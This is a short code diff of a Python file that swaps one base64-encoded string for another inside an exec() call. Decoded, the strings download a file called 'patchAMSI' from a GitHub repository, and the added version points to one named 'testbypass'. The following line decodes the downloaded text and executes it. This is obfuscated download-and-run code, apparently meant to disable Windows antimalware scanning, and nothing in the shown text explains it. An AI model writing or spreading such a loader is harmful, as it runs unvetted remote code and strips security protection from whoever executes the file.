@@ -4,5 +4,5 @@ import base64
 
 
 vari = ""
-exec(base64.b64decode("dmFyaSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkYXd6L2xpbWQvbWFpbi9wYXRjaEFNU0kiKS50ZXh0"))
+exec(base64.b64decode("dmFyaSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0tpZW10cmF1MjA1L3Rlc3RieXBhc3MvbWFpbi9wYXRjaEFNU0kiKS50ZXh0"))
 exec(base64.b64decode(vari))
